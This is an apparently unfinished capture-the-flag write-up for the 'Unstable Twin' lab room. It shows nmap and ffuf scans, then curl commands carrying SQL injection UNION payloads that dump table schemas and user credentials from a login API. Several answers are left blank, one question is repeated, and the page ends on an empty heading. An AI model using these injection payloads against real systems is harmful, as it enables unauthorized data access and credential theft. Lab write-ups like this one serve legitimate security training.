<p>June 26, 2025</p>
<h1>Unstable Twin</h1>
<p>A Services based room, extracting information from HTTP Services and finding the hidden messages.</p>

<br>

<h2>Task 1 . Unstable Twin</h2>
<p>Based on the Twins film, find the hidden keys.

Julius and Vincent have gone into the SERVICES market to try and get the family back together.<br>
They have just deployed a new version of their code, but Vincent has messed up the deployment!<br>

Can you help their mother find and recover the hidden keys and bring the family and girlfriends back together?</p>

<p>1.1. What is the build number of Vincent's server?<br>
<code>1.3.4-dev</code></p>

<br>

<p>1.2. What is the build number of Vincent's server?<br>
<code></code></p>

<br>

<p>1.2. What is the build number of Vincent's server?<br>
<code></code></p>


<br>

<p>1.3. How many users are there?<br>
<code></code></p>


<br>

<p>1.4. <p>What colour is Vincent?<br>
<code></code></p>

<br>

<p>1.5. <p>What is Mary Ann's SSH password<br>
<code></code></p>

<br>

<p>1.6. <p>User Flag<br>
<code></code></p>

<br>

<p>1.7. <p>Final Flag<br>
<code></code></p>

<br>
<br>

<h3>Nmap</h3>
<p><code>22/ssh</code> and <code>80/httpngnix 1.14.1</code></p>

```bash
:~# nmap -sC -sV -sS -v unstable.thm
...
ORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    nginx 1.14.1
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
...
```

<h3>ffuf</h3>

```bash
:~# ffuf -u http://unstabletwin.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
...
info                    [Status: 200, Size: 160, Words: 31, Lines: 2]
```

```bash
:~# ffuf -u http://unstabletwin.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -X POST
...
api                     [Status: 405, Size: 178, Words: 20, Lines: 5]
info                    [Status: 405, Size: 178, Words: 20, Lines: 5]
```

```bash
:~# ffuf -u http://unstabletwin.thm/api/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
...
login                   [Status: 405, Size: 178, Words: 20, Lines: 5]
```

<h3>unstable.thm/info</h3>

![image](https://github.com/user-attachments/assets/2350a1aa-51f7-4e7a-a05f-3562e7df76f5)


```bash
:~# curl -v http://unstabletwin.thm/info
...
* TCP_NODELAY set
* Connected to unstabletwin.thm (TargetIP) port 80 (#0)
> GET /info HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Thu, 26 Jun 2025 ...
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: 1.3.4-dev
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host unstabletwin.thm left intact
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>
        <title>The page is temporarily unavailable</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            /*<![CDATA[*/
            body {
...
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin&password=password"
^C
```

```bash
root@ip-10-10-144-230:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin&password=password"
[]
```

<p>The same Request generate different Response!</p>

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=' UNION SELECT 1,sqlite_version()--&password=password"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>
        <title>The page is temporarily unavailable</title>
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=' UNION SELECT 1,sqlite_version()--&password=password"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>
        <title>The page is temporarily unavailable</title>
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,sqlite_version(); -- -&password=admin"
[
  [
    1, 
    "3.26.0"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,tbl_name FROM sqlite_master; -- -&password=admin"
[
  [
    1, 
    "notes"
  ], 
  [
    1, 
    "sqlite_sequence"
  ], 
  [
    1, 
    "users"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT username,password FROM users; -- -&password=admin"
[
  [
    "julias", 
    "Red"
  ], 
  [
    "linda", 
    "Green"
  ], 
  [
    "marnie", 
    "Yellow "
  ], 
  [
    "mary_ann", 
    "continue..."
  ], 
  [
    "vincent", 
    "Orange"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'; -- -&password=admin"
[
  [
    1, 
    "users,notes"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE tbl_name='users'); -- -&password=admin"
[
  [
    1, 
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE tbl_name='notes'); -- -&password=admin"
[
  [
    1, 
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ]
]

```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,(SELECT username || ':' || password FROM users LIMIT 1 OFFSET 0); -- -&password=admin"
[
  [
    1, 
    "mary_ann:continue..."
  ]
]
```



<h3>curl</h3>
<p><code>Build Number</code> : <code>1.3.4-dev</code></p>

```bash
:~# curl -v http://unstable.thm/info
...
> GET /info HTTP/1.1
> Host: unstable.thm
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Thu, 26 Jun 2025 ...
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: 1.3.4-dev
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host unstable.thm left intact

```

<h3>html2txt</h3>

```bash
:~# apt install html2txt
```

<h3></h3>
